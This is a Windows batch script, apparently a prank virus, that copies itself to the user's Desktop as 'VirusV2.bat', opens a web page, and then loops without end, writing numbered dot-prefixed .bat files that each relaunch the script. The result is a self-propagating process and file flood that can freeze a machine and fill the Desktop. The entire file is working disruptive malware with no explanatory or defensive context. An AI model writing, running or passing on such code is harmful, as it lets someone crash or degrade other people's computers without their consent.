@echo off

echo @echo off > "%USERPROFILE%\Desktop\VirusV2.bat"
echo start "" "https://google.com"  >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo goto :a >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo. >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo :a >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo for /L %%i in (1, 1, 9999999999999999999999999999) do ( >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo echo @echo off > "%USERPROFILE%\Desktop\.%%i.bat">> "%USERPROFILE%\Desktop\VirusV2.bat"
echo echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo echo :a >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo echo start explorer "%USERPROFILE%\Desktop\VirusV2.bat" >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo start explorer "%USERPROFILE%\Desktop\.%%i.bat" >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo start explorer "%USERPROFILE%\Desktop\VirusV2.bat" >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo ) >> "%USERPROFILE%\Desktop\VirusV2.bat"
echo goto :a >> "%USERPROFILE%\Desktop\VirusV2.bat"

start "" "https://google.com"

goto :a

:a
for /L %%i in (1, 1, 9999999999999999999999999999) do (
echo @echo off > "%USERPROFILE%\Desktop\.%%i.bat"
echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat"
echo :a >> "%USERPROFILE%\Desktop\.%%i.bat"
echo start explorer "%USERPROFILE%\Desktop\VirusV2.bat" >> "%USERPROFILE%\Desktop\.%%i.bat"
echo goto :a >> "%USERPROFILE%\Desktop\.%%i.bat"
)
goto :a
